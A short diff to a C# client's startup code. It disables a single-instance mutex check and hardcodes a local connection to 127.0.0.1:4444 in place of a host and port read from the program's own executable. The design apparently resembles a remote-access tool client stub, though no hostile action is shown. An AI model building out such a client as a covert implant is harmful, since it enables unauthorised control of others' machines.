@@ -19,21 +19,21 @@ namespace Client
         {
             bool result;
 
-            bootController = new BootController();
-            StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
-            var mutexKey = BootController.getMutexKey(readerMutex);
-            var mutex = new System.Threading.Mutex(true, mutexKey, out result);
+            //bootController = new BootController();
+            //StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
+            //var mutexKey = BootController.getMutexKey(readerMutex);
+            //var mutex = new System.Threading.Mutex(true, mutexKey, out result);
 
-            if (!result)
-            {
-                MessageBox.Show("Another instance of application is already running !");
-                return;
-            }
+            //if (!result)
+            //{
+            //    MessageBox.Show("Another instance of application is already running !");
+            //    return;
+            //}
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
-            //client = new ClientMosaic("127.0.0.1", 4444);
-            client = new ClientMosaic(bootController.host, bootController.port);
+            client = new ClientMosaic("127.0.0.1", 4444);
+            //client = new ClientMosaic(bootController.host, bootController.port);
             client.connect();
             //GC.KeepAlive(mutex);
         }
